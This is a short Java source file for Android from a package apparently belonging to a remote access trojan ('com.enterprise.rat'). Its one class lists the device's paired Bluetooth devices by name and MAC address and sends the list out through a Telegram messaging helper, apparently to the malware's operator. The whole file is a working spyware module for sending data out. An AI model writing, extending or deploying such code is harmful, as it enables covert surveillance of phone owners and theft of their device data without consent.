package com.enterprise.rat.commands;

import android.bluetooth.BluetoothAdapter;
import android.bluetooth.BluetoothDevice;
import android.content.Context;
import com.enterprise.rat.utils.TelegramApi;

public class BluetoothScannerManager {
    private Context context;
    public BluetoothScannerManager(Context context) { this.context = context; }
    public void enumerate() {
        BluetoothAdapter adapter = BluetoothAdapter.getDefaultAdapter();
        if (adapter == null) { TelegramApi.sendMessage("No Bluetooth"); return; }
        StringBuilder sb = new StringBuilder("<b>🔵 Paired BT Devices</b>\n\n");
        for (BluetoothDevice d : adapter.getBondedDevices()) sb.append("<b>").append(d.getName()).append("</b> <code>").append(d.getAddress()).append("</code>\n");
        TelegramApi.sendMessage(sb.toString());
    }
}
